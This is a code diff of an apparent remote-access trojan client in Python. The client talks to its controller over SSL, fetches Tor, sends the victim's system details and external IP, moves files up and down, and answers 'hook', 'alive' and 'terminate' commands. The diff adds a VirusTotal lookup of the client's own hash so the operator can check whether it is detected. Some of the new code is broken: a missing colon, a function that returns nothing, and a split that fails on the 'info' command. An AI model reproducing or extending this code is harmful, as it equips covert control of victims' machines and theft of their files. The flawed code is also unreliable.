@@ -43,35 +43,25 @@ cType = "client000-crypto" #client Type
 global log1
 
 ######### virtus-total check
-VTurl = "https://www.virustotal.com/vtapi/v2/file/report"
-try:
-    with open("Windows-client.exe" , "rb") as thisFile:
+def VTcheck(VTKey)
+    VTurl = "https://www.virustotal.com/vtapi/v2/file/report"
+    with open(os.path.basename(__file__) , "rb") as thisFile:
         HF = hashlib.sha256()
         HF.update(thisFile.read())
         thisHash = HF.hexdigest()
-except:
-    thisHash = "nope"
-
-# to get your apikey, log in virustotal
-#parameters = {"resource": thisHash, "apikey": "YOUR VIRUS-TOTAL API KEY HERE"}
-#response = urllib2.urlopen(urllib2.Request(VTurl, urllib.urlencode(parameters)))
-#jReport = response.read()
-
-# extract some data
-#response_dict = simplejson.loads(jReport)
-#rPositives = response_dict.get("positives",{})
-rPositives = 0
-# check VT stauts
-if str(rPositives) != "{}":
-    if rPositives == 0:
-        VTresponse = "VTcheck: safe | scanned \n" + "|--- sha256: " + thisHash
-    elif 0 < rPositives:
-        VTresponse = "VTcheck: not-safe | scanned: "+str(rPositives) + "\n|--- sha256: " + thisHash
+    parameters = {"resource": thisHash, "apikey": VTKey}
+    jReport = urllib2.urlopen(urllib2.Request(VTurl, urllib.urlencode(parameters))).read()
+    rPositives = simplejson.loads(jReport).get("positives",{})
+    #rPositives = 0 #just for testing
+    if str(rPositives) != "{}":
+        if rPositives == 0:
+            return ("VTcheck: safe | scanned \n  |--- sha256: " + thisHash)
+        elif 0 < rPositives:
+            return ("VTcheck: not-safe | scanned: "+str(rPositives) + "\n  |--- sha256: " + thisHash)
+        else:
+            return ("VTcheck: error occurred")
     else:
-        VTresponse = "VTcheck: error occurred"
-else:
-    VTresponse = "VTcheck: probably safe | not scanned \n|--- sha256: " + thisHash
-
+        return ("VTcheck: probably safe | not scanned \n|--- sha256: " + thisHash)
 # sysinfo
 uname = platform.uname()[0:3]
 
@@ -122,10 +112,11 @@ setup()
 staTor = DownTor()
 
 # getting target IP
-try:
-    myIP = urllib2.urlopen("http://myexternalip.com/raw").read()[0:-1]
-except:
-    myIP = "Error! Can't check IP!"
+def myIP():
+    try:
+        myIP = urllib2.urlopen("http://myexternalip.com/raw").read()[0:-1]
+    except:
+        myIP = "Error! Can't check IP!"
 
 def RecvData():
     temp = ssl_sock.read()
@@ -401,8 +392,8 @@ while 1:
         UploadFILE(inText.split(" ")[1])
     elif inText == "info":
         SendData(str(uname))
-        SendData('ip:'+myIP)
-        SendData(VTresponse)
+        SendData('ip:'+myIP())
+        SendData(VTcheck(inText.split(":")[1]))
         SendData("end-info")
     elif inText.startswith("hook"):
         if len(inText.split(':')) == 3:
@@ -422,6 +413,8 @@ while 1:
             pass
     elif inText.startswith("upload"):
         DownloadFILE(inText.split(" ")[1])
+    elif inText == "alive":
+        SendData(cType+" :: alive")
     elif inText == "terminate":
         ssl_sock.close()
         sys.exit(0)
